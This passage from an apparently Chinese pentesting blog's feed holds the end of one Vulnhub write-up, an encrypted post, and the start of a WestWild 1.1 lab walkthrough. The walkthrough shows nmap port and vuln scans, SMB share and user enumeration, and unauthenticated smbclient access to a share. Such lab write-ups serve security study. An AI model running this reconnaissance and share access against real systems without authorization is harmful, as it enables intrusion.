pfifo_fast state UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:a9:a2:<span class="hljs-number">24</span> brd ff:ff:ff:ff:ff:ff<br>    inet <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.10</span>.<span class="hljs-number">10.255</span> scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::<span class="hljs-number">20</span>c:<span class="hljs-number">29</span>ff:fea9:a224/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>成功提权</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web运行基础环境搭建与加固</title>
    <link href="/2023/05/0bc08ec3efc4.html"/>
    <url>/2023/05/0bc08ec3efc4.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="34a8d32360634cdf60ccb851f490f1aa248e0957af5da8547b62412b0d1d59b3">91c22b0949579c4c6d0a72472c379600af9f9052db5670fdb86862a890c6d1d5b99112ead43194a6a7e5f6fff746f845b14946ac3ecc325d418f74e651d88a7d670efbcb1bbec8bf085b83694c930ce9ed9fd08f50352248f6e06576a0cec0d700c4267505e9c84e44302fc13f2797f2789b98b3753e01b2a59d5725898d5577b17c1ac5fd02e7ce0372c165e680cfac660db57c920a37361f39f9aa56d174a49d3b2a64b3556c4e8bad45318f10f2575f113cdc43c7c70d5999e504adbf58021189776e6c0118f29e462737fb402cb501d588334259123d9c5bad03091c8ea07231e948c0e03b216756960747b14a413186c871e5e4bf9c68eda6430607a2d6b06ec779fca1ead1eb5dbfbf67e43db571dd233ba3cc4f2c87cc55ec77705c7b598a8aec10557864b66ff008e49c968e1a996cb5c9f9d249a3c61a254ca2d2c59f58027387de94da4fde206e94b6f7d0f56bb164e4707cc222510ad2fc51905ac1ebd010905fe96df3f2e4e0a4cb28b9652a04bf4001ce98dbbb6c656032c5ba489bf7e00297b2a91637707a924bc17500832665e0d230dcc910d9221f8d53b4d0d2ed57b4df0c0bf6672bf400490fe35946bde61077fe6274a234ee7e9627edf2b56874f03f38d937df0af12458ed1fb9a6b6f220b5d05f71a8076215e5b56b41e7a03848b2039c6dc74024bd63178c1727f7224307b9b1f4de591987c6d102e7f3eaf72545cf48ffa36d524c6078907c48f0d5b34bcc80861b7599444b477202337923b3cd96e178df5e3f4a9cd5b0db067a8bbb24b15ffbd6813e3980ef2ee7418684013a856990e1aa3661e60ebb126a25f3cdca2f45064d7b86945c4679806de83329f0e3fb5d193dac390e2592117e5e358de2c2314c090b2f021c8bfcca63db77ef0d33c567b6b096571b9ac37dc1fe694a5bebf96d0aa638c9ad9324936eec90669c8edcb0f006b7dea0978e9be3b1104db8c2e41ab3bac2707b088a68c83d7756600611f9f85ce0993d757b9b58ce0411dc6b3dcbafae9caa9f7bb1137815a48039ed8b6839f9330d44f3ccff0ea406004c48bbe78f96aee1dca0ec0a3493860909671de85763a7b632fdfc29fd28ce9c20e002bd0158ad23637c8fc6600914f4f2c752e7ebc04d410a7a81d468579b82ba379db3c0051a28f13d52980acc60e7416a133357585ffd59c083a3392cc23735df4325575b792ee2da17b732f09132b32a3041c3a29f70854bd4c325b7040ee6b94df122bccffeb06e62fc951b941ca7c90d74dc13bfcf0203204978fd1321ca5ba78cfabc236b543a71236c3086d92706d00ec7ff2e07e92eb5e5267cc1550369c4e49de649bb74a0c0e8b41d0b9e1c29e8b35677cdc7b6e86f4e07d19feb626fa19319b3e75979c3e63898e1aa3721f375b4ee83a34bad8cc7dbfc1fb5ed3ce1cc0b23dabe670405c1b5919fb6081628561a083557cba7371a8c009cd4241a416b2733996a5bd14fb3cbe39ef0f0a7bf979c65d56a728bef2059cba5ab3d12cbfc3b0a0fedc19a28197c7bebbe0382d648604fcc4ff660041decd6fed4da0b1287f6d07a8f7f61257011f319d3c74e2df40c24779a976685aa31817ae33a43702671ea09accf3654ef16d4d1b4d766da3682ae47ef2b32ce12a87f0e70649539dfb1e917b7d48b8c711df0a36520d0bdbccb24a36d31f5191eb92de760c211cb2716ae98412ce747659a3955ddb9ce881b4bce5e231e159734d4964175360e38f2c503c7fd724cd09333e001ba9d0ba257aa83763df1a0502d16bd1fbe9ef3d21face66cf0e8216e39b10586f466e8e6cef7b054b87cc4de9b81b6d0236291ce0857584d4947c6309ad3cfc873ea7473ba75de47e9b85b3ed7673dbd64b73fa0cf1cb91be8f0fb5a59e1c8b2a0ad8125d4bbca64267bbdac61fe9e1c5c8613f8885868428bd5db287dc362a0f4e5623872498a29502e848d5e5ff1692a2b013875ee5db938a31e03731d73b1f157644c0d2c0b39197a301c63bae177447affd332aec14dbb264615ee2f3c71b488fa61804343020faf08a84aee6f5483f47880524b2b0c2a8f017d508ff44ced2abd62eb15faf01de18f40317f21bc95ab32b95b9399dc99ac179a2e4daef2d8bd6413d3505b915a7032abb8a215424dc5af4a70bf66c52950588f39c4371eb5d79cb724ac8c20eb956b56fd6028102648e03cf3db72fbb43ec14fe8e38a2f30ba1e2c1e576ced1cd0b483753da1543033832ab3898857b84791148610ab1350438fdd8dc44a0864b2070a9bcbe4bdefe04045e762599e80b54afeab80d6ba31f44a3a7b516fd4549fad208e5e39493a1fd428619c9be55e2cb02a412e8715055d23518a1e191e4b3c32c1a3c038b43b733c51011814ae8a86302bd3a9c2a3063ba2f07eecd827984df21e85c417ec78b302798addc7c2781f4f6a56b9ab533d8c2747afb5d1f0ea73a09e6380b77a07b73aa13203bf57b79d10cc66bd37b8dad6b102bd62fc7baef4a367bddd5d2ee4a3ff85f0be25656cf270dbc49f029cd6ab596c14916e1bdb476f800aa9426b66e7c8344ca0f8aaf4919fb9eeccfbc3df33572341a89870e8b42df62b73160e80eeeaa4094c50a7ec96524f9bbc95d6e33792a2611bc3d35aab0f842f3cc3708ea0067ff656c2c999b1796d73b576459941327c61bfa562a18d86fc5ae8ca777468a045cb6e3f1c142471645422e43872105aa09f5c127df43f202ed62b895520475647104e5c567b167ac1de66ee2581dbbe3b8031059696557fa8298ce2d33a7734ad9f595125becd91a4b7d381c8491ee88a66feea40f513d4d3dd81dd57fa408218bbd56a47b3f49da482853b0e3e85e98b439693dc9290c94813e75d1f03807cba2b6dfbeb996018fc20cb90f7b90f24f2a0350c06e30946943759242f4330d9f8a78c99a336b931bc1fb763b0c74cdbdf2cef9ccdf56d46d79214bf5165ba9ade8af30af413f2117faf241db28357aca03da63dad540bf015df6c2251082f2080214fdc4521d0ffb2146c0f5a312965ce3528771923ed2f12ca16c104bc25cd3c8b0f9a8bf3ae0921c4deb9977a1ca7b6bbecc6a4f1ad568e9a4a2b865da16f24a43eba1e3d7982cc7e08b3ab8ce494811d5916432dd43e03748af0514d08f64b11154a82ced7029e241f3e9c9cf91c55d1ad42e203eef6c820d68ae2e86cdfee0f4086d0dc16f952773f91ee3c163f6697eb68731d31be459632adc11cfb17c71dffc2d24ae07fd834320d87f43cadfbb6d75bb08baca2e7cb61e0ac240fa14ab7f2ea9d5d6daa43b002f08864bfc9fe5be994ebe9bc10f8f6c54c5906e5cf9e15092b679f6532718768849ed174c117c1824163caa703117f9f80893d77c5d553bb5e04ad3174d43a56e533cd15015d812ab6c2d8630f069c1553a8011c7697a0bc81c116a21545c98f541a89a2be5cbe2a73e13991cfd5a7ea6853e861be5c80cf18c81c94b7d0435238fca55639a7aaa25c8d726c67e86917d26add9b57f45e6db6f8e44a17b854c9f78ddd2479eecf6107381d2aa26dfddeefb738df4810f03f8a81d32020ee1d62f1eb1c0dba422570e4ce3fc0eb83caad74568ab79ba6364502cc9e7715cabc5684191ed424d698a739fe2e81d7541f01e28aa549d39a8ca908480b6d7619ab45cecac4fe83958413f59f1200beac87f536bd2f1224940fd738f106337f7369adb724965d017880f661dfa8ee054e6e7fc9ea4fcd677fd092326b90c649d24956779dda96c076b1aff1e9b6193a6824baab53195ad6563351ec924f53fe731827c55625b8a0cb722ba340e150171d122c17276473892aef36cbe94704624ddbe778c360f92bdece9ac06da4a838b1d02686871c78271bd615d81bab2953b26c145c6143dd679411619d44297b370e90b1c6dd8e6fccf4731aa5169e05051fb8ac547450ba913565fdcca59b4074e889cad07fae67b37238011a955f54e8163e5bc8b7487b3ae56ee9d98479b8619c9dffd09879b297965f0ed4989819192e30c1ed00ced9b2bc449d002ed5a9d79902529facaee1cb1320792a2bf761673101fd8012be3f5728e611920b77d0be4240c64873e554c7b304dec206ec58a3fb75827948057abaaa380e3f7d7acd7f4612db637ba1b0f998685a53aa2961feb61fe906b0f03b09328cd9274b9ef2ffd6a43fae2baaf78cbf314e035e309b9013f703d5963dccd2294ad329298ae3a502ab92ebfa71a3de1b9aef1c9e12e732a086fd4f56e0b66b8008b4c429ed1bdb117dd48d76781ccb644447c5cf45b536bbef315ab7bb80d8cd0179b62881b0fbbd9528366c7c3aa1389ab53f4b88fa08a29a0b0d66c29396a777469d342261b9026fc8fe63da322a7b2bb7900d9139738569f2ee9ee372fcca55e5452e5e42b74e28ec19752ada0581bfcdf07d6471bd2e95b6e416ad7c800bf732c79855bb60a1907841d2093b34a7b1a211e526849f5afb1821ac07b53c5b785c2148c67631fb6c4ed1fcdf75efd158299dea4393c2a13ae2dc2023fb4c01110ed33ef88c8be0baa7720280f3b4b7d4cb9ae652528b6f0ef4f0a0879f8f0db9a3bfd636ba8cad8e84e41db397e06f07faa169d937f9a0db812f4ac0d68460feb27cfbf66134d6a1161bcc7c124909b4b62adbe0902132317dfb67dfce81257d4214a24d8a1dd18773d955797a2dad628feb769b1575a02a97d7960a34c2763c09aefe6fc130c7abd29b3860150f66dfe9aa3e0d28aa109b34431026f1270e60258b5bf6c85c1fbabc7127022caf96ac335c0ce67d33fd52587ae753ab6064553ffdf78685479291ee2a0daa9ea03221efc4af19632f9be9380fc3b73011836f10cd5750d1fbfa3a2055167edc6b51fbf9322356af1581e30f8c8cbcb024edc99f60827655b305539043f90b7aa9f2937af07c43a78da9b5903e8382c8614f07e90f46311747606ec93abbc548883ebd3565ce35288af182f831504b78ed1dfa469b4c7c01078afba8b5079108bdfd02a55ded9993e1a9f7feecfd52b914894c4b538e26a1c9b0122dd9fd2bb71cf078f210a3097f569ac259ee9943e815738b7f42f2a6bf9f988d807a99f442dc76bdadc5a2d5b49ce9749098c2acaa197a1a2384ee9dd8e4f744251e71ef02e1939506d20010dee589ba041190ad58d07899f45d1e83ece98f6e695d442e42475b5f31073b12bafa582b7b4d535ece7a8bba2e0d115db6eb91c3f9a69bdc11f93eaf9be60eb62066721b323f1c0ef316a68b35eb3bb894b2354238542d5291a3338bbd52c7de39838f1d17540b236884201289375f125a04b2644803aa4843a41f205abb3ac7ded056680efa0eeb10e16c4138a12a1994d6080b43c07968f24e47a279c85350ea7c8c2d9a246d1e8afa6bf09d6de7fe7a69ef44998a26046d0d30d991940941d77a28e09797ff6e057f39496530d1bfdebe226fb7788f269afa5e3812d2ed439233f7fba305defe3220d2ae60553f683bed146abf4ec9ce053b96870a34e0184bd6d16ab2ef8b88f768a49b9f6088c1f559faa78e2cb74fb4205553d0c7087d610c2e929798f68ea7839b823dda546d46525289b98e332e4872d921eb348fcbf1805f7efde3ba96e75869f4b98448c04bef5e34c2a9c62a715e524e6bea48d488467bd14329efd0c7805c7f1b32dd9dc3b0dd499c73d8a517b6c28c7f78640ccdf40a0046ae849aba5ae1ca8f142992a4830c2803fc77bbfb57ebae5b6f8d9747ace96d6250086caa87c2bbb24c11158b8c0a6ffff98db8cffdafe123b7ea5e6cce468bf4a1891adb5a8d4439889316b3cd21e02920264ef0865bca9a7f8064b626773c805a75a6e0815b53af50e329a8206bde3a542b62776489ee9a030dcf43d0fec8032c845df1727aea1749857ad0f907e77e713a22f5ec152312d9caaa1b1f1da8e53e1e2d6a841296e49172750eaa77c61063bc1792e9503f1d72925003452afd4eaec3becf18c6c24c5c33151db8c816742a98e1782e7d3f4dfe70cb74c095ecae06b077d8fdfca885911526e48bac37c83d20028dda098646929819cffee479d5ac78d18ed2018b4b2ba0707711e88faec2b20ebd6ba9af6256fea05c19e09fac50ae02898a69174c1f345f0c9badc1b50fac69e73d9f5de569b840c743944ffe2793f539dedb1b59ea6c0a3d70d91704259550a6d6c5760f25730f52d85689eb1a9f1ca4b517f36f9658d87af5dbee3548191724b9d01629c5cb8175c33f63015b100723ca1b853a32cb66302fde0153e4b7aba2c9d8263ba9457956f19725cc8da2bcd4aa56d7f478416e773d62520234eafb912925031189aef23450beb2e1e00955fb1527766ad068a8b043fda9e15bca938bbd20716fccd3969aead15d90722afbde63de18cf6881bd9a207ff50b9998e1cd492bbf8190121430a29ff94cc7c96571b9ebaec641196ba33d5a938ac04f6ab66e8505ac6f826315dbef6698e63dae4dcdeef163366825b882e89c3175bb68dd743aeb70f082c80044f1ab26867084c51e01f662b2adcfb9bbf16f60ed72e7e6cdee9beec3c0fea818fba10911658c1168fa393dae9297eae2b8c9956537258a311e610252d6e402b935815d0b96155b4918a210b10a1168b407edfedf42445b928f8f1c5a5339b943b9060ac467e0e2fc22997fddb7ac295fb0d4049dbe974af52058ff7c5c64826722afc96dc2cb931397b0405d701cc3fb816f5f63d834b8356b982b41453746d0a016ada46dce820c21f951fc1649369990cd6114403023e859db24a671cff586e0ed66754864e584a4f09a3b7c1619b6e1cd1d7e1e777044b6e472943d21b88be682e9c71145651e09962b0668e60eb3cc2f901088ccc00e75a490424d204e677be70f91bf329d970b4e905edcad02884958dc1cd9d92f3c7897a288cd70938a541b73888e6d392aada6df387419706c8462e323ad42499f2dca271ef4f1cd209e1a9694d7c1a37f1f7d96d5d8771a83874f3804dd723d0687a7640de57f694c492b13eef1b1dc73d930867a77aeac186275a8d340588d621e3559de791e658c432e1d35634a77d074b6a4f3fd851500cbcfcaaa1d09368620ac13866695a69ffd22143d0392cab044169bdfa3fdeb83823097f5d24d20ef21bdcea3b168e94ce6c3fffb2bb9487f72cbd31f85125c2c4c1a935a52081152bbcd8ea30641df5703d8eba62512a4cb6c1db914de99eca513f37dbcc0f4463532ac03c734aac0b37aa374b6a1d594b2bd74bdeb9410ac01f37615abbc018ce5f2b37e273664bfac3f47e29c016c012970c5a5f66d40f3370a8903976acb35052531d7fd8138b55e1ab32a9e0a7a9b1f0a08c6a1b5963ba5d9014262ab9ec41cf5df9f12ee512f8b1815236d07432dbcc177ed798d7e6a432f4d91685b3f20ed4570dcc3d78922c5dbdc634a530599480bc2dc8484473e3b6fe996b5c38a476e3de6f2419767cd86cdea732874c7811025bd13f713eeba0396656a0bc5e55623e9b39a93e5af1ac3e75479904433f014d3b7140e47ffd57533273512e0921f788031e92d1e1ba738866d97d935b6ae23512ba8e5d55fc23140959c6f21fcc4f59468693f12d8e61ead25278bd55fafb51cf09c09c70cd19fb4d52530fd1231bf228ee1fea9e7660488baf4d1d1cc2f3dda4c98636fb9ca5753107fc2c420f451583aa4bb070e24d7851e89b6a7f001915844d648c09ded0878d8260a709f38dfee967e0c5ec4e4c8edc45c275e7c6b9bba6ba6e7cc1bb8be0c418a46d7f2270d093f03c9b02cd265c5c6e98b8725ad8a56b0031d20e9aa2da713ae350b6e4e4d545ad859d0152059fd2943253f19c1656b61a3e43a195d29eaa55d51ee82ef5434fdf97377b0b6b35b59e60f98d790511bd0415a6df9de85f97513596430eb763b7eac90f06ec55f7d04aa605919b2a4aa7f1aa025f8623d3ed1d8eccc614fef2496d0f48e92c7778d7bb06ad3c76130834f7e16986fc77daa187e515b1b84349d38fe3ddd4fff4d4021c8183177022521ae53073b0fc9139975cd98d82fa9297683a8223393d9bef2be02297db55a180a2fc229697999d6470a54da032e09e6f065f0aa65ffbf68f132ee5dffca7b3c9c023a447d546ab651de423c496ba53fa2abbe8bbf3cae2b55fc05dce767fbed8d2aafa4ad4fe638eee73a834352cb4dd9900a58db27466805397f8cab47c18020e2dbe5894d185643684edcfa6835fa75ee0a4933f8b6d695d21585229d91294bb32d6c0021e68e16ab5b3fb93b5c79861c71e0408e6a0843dcb95b63cf0f5ca9660a8c2bf7e829d44d2c4ecaa08fca00810ad7c013bbe806126489653d1dfd8c6c659f689d168c4e16bda61e9fd73f6eda37afa315c81ee514</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>technique</category>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WestWild 1.1 靶机</title>
    <link href="/2023/05/413cb738f5c5.html"/>
    <url>/2023/05/413cb738f5c5.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>一台简洁、标准而不失趣味的靶机。samba 信息泄露获得立足点，权限枚举获得敏感信息，实现横向移动，sudo 枚举获得 root 的权限。</p></blockquote><h1 id="WestWild-1-1"><a href="#WestWild-1-1" class="headerlink" title="WestWild 1.1"></a>WestWild 1.1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.107<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-25 03:11 EDT<br>Nmap scan report for 192.168.56.107<br>Host is up (0.00028s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 2.02 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,139,445 192.168.56.107<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-25 03:11 EDT<br>Nmap scan report for 192.168.56.107<br>Host is up (0.00031s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)<br>|   2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)<br>|   256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)<br>|_  256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)<br>80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Site doesnot have a title (text/html).<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: -1h00m03s, deviation: 1h43m55s, median: -3s<br>| smb2-security-mode: <br>|   3.1.1: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_nbstat: NetBIOS name: WESTWILD, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-time: <br>|   date: 2023-05-25T07:12:06<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: westwild<br>|   NetBIOS computer name: WESTWILD\x00<br>|   Domain name: \x00<br>|   FQDN: westwild<br>|_  System time: 2023-05-25T10:12:06+03:00<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds<br><br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80,139,445 192.168.56.107 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-25 03:12 EDT<br>Nmap scan report for 192.168.56.107<br>Host is up (0.00024s latency).<br><br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\&#x27;s resources causing Denial Of Service.<br>|       <br>|     Disclosure date: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>|_http-stored-xss: Couldn\&#x27;t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\&#x27;t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn\&#x27;t find any DOM based XSS.<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_smb-vuln-ms10-061: false<br>|_smb-vuln-ms10-054: false<br>| smb-vuln-regsvc-dos: <br>|   VULNERABLE:<br>|   Service regsvc in Microsoft Windows systems vulnerable to denial of service<br>|     State: VULNERABLE<br>|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br>|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes<br>|       while working on smb-enum-sessions.<br>|_          <br><br>Nmap done: 1 IP address (1 host up) scanned in 320.92 seconds<br></code></pre></td></tr></table></figure><h2 id="smb-渗透"><a href="#smb-渗透" class="headerlink" title="smb 渗透"></a>smb 渗透</h2><p>smb 脚本扫描一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.56.107 <br>[sudo] password for kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-25 03:14 EDT<br>Nmap scan report for 192.168.56.107<br>Host is up (0.000075s latency).<br>Not shown: 996 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\192.168.56.107\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (WestWild server (Samba, Ubuntu))<br>|     Users: 2<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\192.168.56.107\print$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|     Current user access: &lt;none&gt;<br>|   \\192.168.56.107\wave: <br>|     Type: STYPE_DISKTREE<br>|     Comment: WaveDoor<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\home\wavex\wave<br>|     Anonymous access: READ/WRITE<br>|_    Current user access: READ/WRITE<br>| smb-enum-users: <br>|   WESTWILD\aveng (RID: 1000)<br>|     Full name:   aveng<br>|     Description: <br>|     Flags:       Normal user account<br>|   WESTWILD\root (RID: 1001)<br>|     Full name:   root<br>|     Description: <br>|     Flags:       Normal user account<br>|   WESTWILD\wavex (RID: 1002)<br>|     Full name:   XxWavexX<br>|     Description: <br>|_    Flags:       Normal user account<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds<br></code></pre></td></tr></table></figure><p>尝试无密码登录，匿名登陆失败，wave 登陆成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ smbclient //192.168.56.107/anonymous<br>Enter WORKGROUP\kali\&#x27;s password: <br>tree connect failed: NT_STATUS_BAD_NETWORK_NAME<br><br>┌──(kali㉿kali)-[~]<br>└─$ smbclient //192.168.56.107/wave     <br>Enter WORKGROUP\kali\&#x27;s password: <br>Try &quot;help&quot; to get a list of possible commands.<br>smb: \&gt; ls<br>  .                                   D        0  Tue Jul 30 01:18:56 2019<br>  ..                                  D        0  Thu Aug  1 19:02:20 